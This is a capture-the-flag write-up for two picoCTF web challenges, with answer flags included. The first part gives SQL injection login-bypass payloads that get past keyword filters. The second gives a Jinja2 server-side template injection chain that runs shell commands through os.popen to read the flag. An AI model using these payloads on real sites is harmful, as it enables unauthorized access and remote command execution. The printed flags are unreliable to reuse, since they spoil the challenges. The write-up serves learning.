# 1. Web Gauntlet

> Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:61726/ http://shape-facility.picoctf.net:61726/filter.php

## Solution:
In this challenge we have 2 sites, the first one a login screen which we need to log into and the other one gives some info about each round's filters'  
We need to login as `admin`  
The website uses filters which we need to bypass.  
- filter for round 1, `or`  
We write `admin' --`, this puts the username as admin and bypasses the password by making it a comment.  
```sql
WHERE username = 'admin' -- ' AND password = 'whatever';
```  
- filter for round 2, `or and like = --`  
For this we type the username as `admin` and the password as `1' is not '2'`, in the query the password becomes `'1' is not '2'` which return true.  
- filter for round 3 `or and = like > < --`  
The trick `a' is not 'b` doesn't work in this challenge, there might be a filter blocking it.
So we use `admin';` , the `;` here end the statement, so it never checks the password.
- filter for round 4 `or and = like > < -- admin`  
For this round we are not allowed `admin` string, so we concatenate it using `||`,  
`a'||'dmin';`
- filter for round 4 `or and = like > < -- admin`  
`a'||'dmin';` works as well for this round !

> we got the flag in filter.php as `picoCTF{y0u_m4d3_1t_79a0ddc6}`

## Flag:

```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:

- Filter  
Code that blocks certain words
- Ijection  
When you put in a special text in username, password, etc which makes the server's SQL do something else than intended
- Payload
The speial text that you put in to exploit the weakness
- bit of SQL

## Notes:

- At first I didn't understand the use of the second site and was trying different ways to bypass the log in screen, but later on realised it tells us about the filters for that round.
- We can also use `/*` which is the multi line comment instead of `;` in some rounds.

## Resources:
[SQL ref](https://www.w3schools.com/sql/sql_injection.asp)  
[SQL injection](https://portswigger.net/support/sql-injection-bypassing-common-filters)

***
# 2. SSTI1

> I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:
In this challenge we have a website which announces whatever you type in the text box.  
For example if we type "hello" then the site will print that string.  
Now as the name suggests SSTV(Server Side Template Injection) we need to inject some code into this template to get the flag.  
We write-
```bash
lallu@VedantLohan:~$ curl -I http://rescued-float.picoctf.net:59262/
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.10
Date: Mon, 27 Oct 2025 17:01:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 567
Connection: close
```  
We see that it is a python server.
We try `{{7*8}}` on the site to check if it works in the template and it prints `56` This means it works on `jinja2`.  
Now we list all files in the server  
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```  
Which gives us
```
__pycache__ app.py flag requirements.txt
```  
Now we just cat the flag-  
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}`


## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

## Concepts learnt:
- Template engine  
It lets you create a dynamic webpage, means you can fill in some data in the site which goes into the template and produces the final webpage.  
- Jinja2 syntax: `{{ expression }}` prints the evaluated expression.  



## Notes:
- Mistake I made was that at first I was trying to do stuff like `{{ls}}` which obviously didn't work beacuse `{{  }}` evaluates Python/Jinja expressions and not shell commands.

## Resources:

- [SSTI with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)


***
